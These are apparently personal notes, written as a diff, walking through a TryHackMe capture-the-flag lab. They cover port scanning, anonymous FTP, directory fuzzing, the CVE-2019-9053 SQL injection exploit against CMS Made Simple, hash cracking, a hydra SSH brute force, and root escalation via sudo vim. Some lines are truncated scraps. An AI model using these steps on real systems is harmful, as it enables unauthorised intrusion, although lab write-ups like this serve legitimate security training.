@@ -1,0 +1,175 @@
+nmap -sSVC -Pn -vv 10.10.187.168
+...
+21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.3
+....
+ftp-anon: Anonymous FTP login allowed (FTP code 230)
+...
+
+2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+
+ftp 10.10.187.168                                                                                                    
+Connected to 10.10.187.168.
+220 (vsFTPd 3.0.3)
+Name (10.10.187.168:gd): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
+226 Directory send OK.
+ftp> cd pub
+250 Directory successfully changed.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
+226 Directory send OK.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
+226 Directory send OK.
+ftp> get ForMitch.txt
+local: ForMitch.txt remote: ForMitch.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
+226 Transfer complete.
+166 bytes received in 0.00 secs (275.2281 kB/s)
+
+cat ForMitch.txt        
+Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
+
+user: ForMitch
+
+ffuf -u http://10.10.187.168/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301
+                        [Status: 200, Size: 11321, Words: 3503, Lines: 376]
+index.html              [Status: 200, Size: 11321, Words: 3503, Lines: 376]
+robots.txt              [Status: 200, Size: 929, Words: 176, Lines: 33]
+simple                  [Status: 301, Size: 315, Words: 20, Lines: 10]
+:: Progress: [4615/4615] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
+
+
+gobuster dir -u http://10.10.187.168/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+
+http://10.10.187.168/simple/
+
+Posted by: mitch 
+Category: General
+
+Copyright 2004 - 2021 - CMS Made Simple
+This site is powered by CMS Made Simple version 2.2.8
+
+
+searchsploit cms made simple 2.2.8
+---------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------- ---------------------------------
+CMS Made Simple < 2.2.10 - SQL Injection                                                                  | php/webapps/46635.py
+---------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+
+searchsploit -m php/webapps/46635.py  
+  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
+      URL: https://www.exploit-db.com/exploits/46635
+     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
+File Type: Python script, ASCII text executable
+
+Copied to: /home/gd/Desktop/THM/SimpleCTF/46635.py
+                               
+#mv 46635.py sql.py
+                                                                                                                                                                                                                                       
+┌──(root💀lucy)-[/home/gd/Desktop/THM/SimpleCTF]
+└─# cat sql.py| grep CVE
+# CVE : CVE-2019-9053
+change python ---> python3 ( enable teamcolor)
+print ()
+
+
+
+- To what kind of vulnerability is the application vulnerable?
+hint:
+You can use /usr/share/seclists/Passwords/Common-Credentials/best110.txt to crack the pass
+
+python3 cve-.py -u http://10.10.187.168/simple/ --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
+
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[*] Try: 000000
+
+echo '0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2' > hash
+hashcat -m 10 -a 0 hash /usr/share/wordlists/rockyou.txt 
+
+---> not found
+
+
+ -u http://10.10.187.168/simple/ -c -w /usr/share/wordlists/rockyou.txt
+vi user.txt
+ForMitch
+formitch
+mitch
+
+hydra -L user -P /usr/share/wordlists/rockyou.txt ssh://10.10.187.168:2222
+hydra -L user -P /usr/share/seclists/Passwords/Common-Credentials/best110.txt ssh://10.10.187.168:2222
+ hydra -L user -P /usr/share/seclists/Passwords/Common-Credentials/best110.txt ssh://10.10.187.168:2222
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-16 23:28:19
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 330 login tries (l:3/p:110), ~21 tries per task
+[DATA] attacking ssh://10.10.187.168:2222/
+[STATUS] 181.00 tries/min, 181 tries in 00:01h, 165 to do in 00:01h, 16 active
+[2222][ssh] host: 10.10.187.168   login: mitch   password: secret
+[STATUS] 169.00 tries/min, 338 tries in 00:02h, 13 to do in 00:01h, 16 active
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-11-16 23:31:00
+
+ssh mitch@10.10.187.168 -p 2222                                                                                                   130 ⨯
+The authenticity of host '[10.10.187.168]:2222 ([10.10.187.168]:2222)' can't be established.
+ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.187.168]:2222' (ECDSA) to the list of known hosts.
+mitch@10.10.187.168's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
+$ ls
+user.txt
+$ cat user.txt  
+G00d j0b, keep up!
+$ ls /home
+mitch  sunbath
+$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+$ vim -c ':!/bin/sh'
+
+$ whoami 
+mitch
+$ sudo vim -c ':!/bin/sh'
+
+# whoami 
+root
+# cd /root
+# ls
+root.txt
+# cat root.txt
+W3ll d0n3. You made it!
+
+https://tryhackme.com/room/easyctf
+https://floreaiulianpfa.com/simple-ctf/
+https://docs.google.com/document/d/1cY49hL5pMvdqeqwGCoYjRbY2joxwZykFiv_8a1smC-8/edit
+
+https://gtfobins.github.io/gtfobins/vim/
